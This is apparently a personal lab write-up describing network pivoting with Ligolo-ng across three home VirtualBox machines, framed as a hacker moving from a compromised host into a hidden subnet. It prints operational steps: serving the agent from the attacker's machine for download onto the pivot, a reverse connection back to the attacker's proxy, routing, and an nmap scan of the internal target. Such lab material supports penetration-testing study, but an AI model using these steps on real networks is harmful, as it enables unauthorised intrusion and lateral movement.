### Pivoting network via LIGOLO-NG

## What I Had on Hand (Input Data)
Two virtual machines running **Ubuntu** and one running **Kali Linux**. The decision was made to test the network pivoting technique using a modern tool called **Ligolo-ng**.

### Core Technique:
Tunneling transparent connections between isolated networks through a compromised pivot machine.

### Network Adapter Configurations in Virtual Machines:
*   **Kali Linux (Attacker):** `Bridged Adapter` -> IP: `192.168.1.x`
*   **Ubuntu-1 (Pivot):** `Bridged Adapter` + `Internal Network` -> External IP: `192.168.1.x/24` | Internal IP (DMZ): `10.10.10.1`
*   **Ubuntu-2 (Hidden Target):** `Internal Network` only -> Internal network IP: `10.10.10.2`

**P.S. On the Ubuntu1 and Ubuntu2 virtual machines, I opened ports 22, 80, 8080**
---

## Scenario and Attack Vector
A hacker compromised a regular user's machine (**Ubuntu-1**) and discovered that it had access to a hidden subnet (`10.10.10.x`), but the user's machine itself was completely empty. To expand the attack surface and move deeper into the network, the hacker decided to use the **Ligolo-ng** utility to set up tunnel pivoting.

---

## Step-by-Step Action Log (Guide)

### Step 1: Network Configuration
I am using VirtualBox; if you are using a different hypervisor, please look up the specific instructions yourself.
Open the settings for your virtual machines (in my case, two Ubuntu VMs and one Kali Linux):
```bash
kali: settings > network > bridge-up 
Ubuntu1: settings > network > bridge-up and adapter 2 > settings > network > Internal Network
Ubuntu2: settings > network > Internal Network
```

### Step 2: Configuring Interfaces in Ubuntu
**Important:** If the interfaces on the target machines lose their IP addresses, assign them statically before rebooting:
```bash
# Find the interface name
ip a

# Ubuntu1
sudo ip addr add 10.10.10.1/24 dev enp0s8 && sudo ip link set enp0s8 up

# Ubuntu2
sudo ip addr add 10.10.10.2/24 dev enp0s8 && sudo ip link set enp0s8 up 
```

### Step 3. Preparing Software on Kali Linux
Download the agent and proxy from GitHub:
P.S. For some unknown reason, I couldn't get the latest versions to run, so you can use any version that works for you.
```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.5.2/ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz
```
Extract the downloaded proxy archive:
```bash
tar -xzvf ligolo-ng_proxy_0.5.2_linux_amd64.tar.gz
```

### Step 4. Creating a Virtual Interface on Kali
Ligolo-ng creates an actual virtual network interface card in our system. This must be done strictly as root:
```bash
sudo ip tuntap add user root mode tun ligolo
sudo ip link set ligolo up
```
*To verify, run `ip a` to ensure that the `ligolo` interface has successfully appeared in the list.*

### Step 5. Delivering the Agent to the Target Machine (Ubuntu-1)
Connect to the first compromised machine via SSH:
```bash
ssh user@192.168.1.x
```
To transfer the agent file, start a quick Python web server on your **Kali** machine inside the folder containing the downloaded agent:
```bash
sudo python3 -m http.server 80
```
On the target machine (**Ubuntu-1**), download the agent archive via our Python server:
```bash
wget http://<IP_KALI>:80/ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
```
Extract it right there:
```bash
tar -xzvf ligolo-ng_agent_0.5.2_linux_amd64.tar.gz
```

### Step 6. Bridging the Connection
On **Kali Linux**, start the proxy server using a self-signed certificate:
```bash
sudo ./proxy -selfcert
```
On the **target machine (Ubuntu-1)**, launch the agent and command it to connect back to our Kali machine:
```bash
./agent -connect <IP_KALI>:11601 -ignore-cert
```

### Step 7. Activating the Tunnel and Routing
As soon as the connection lights up in the Kali proxy console, drop into the session management:
```text
ligolo > session
# Select the session number (usually 1)
```
Inside the session, type `ifconfig` and look for the IP address of the hidden network (DMZ) - in our case, it is `10.10.10.1`.

Open a **new terminal window on Kali** and add a route to this hidden subnet through our `ligolo` interface (make sure to specify the network address ending in zero):
```bash
sudo ip route add 10.10.10.0/24 dev ligolo
```
Return to the Ligolo terminal window and run the final command to launch the tunnel:
```text
» start
```

---

## 🏁 Final Result
Check the availability of the hidden network from the new Kali terminal tab using Nmap or a ping:
```bash
nmap -Pn -sT -p 22,80,8080 10.10.10.2
```
**If the ports of the hidden machine show up as OPEN - CONGRATULATIONS, WE DID IT!**
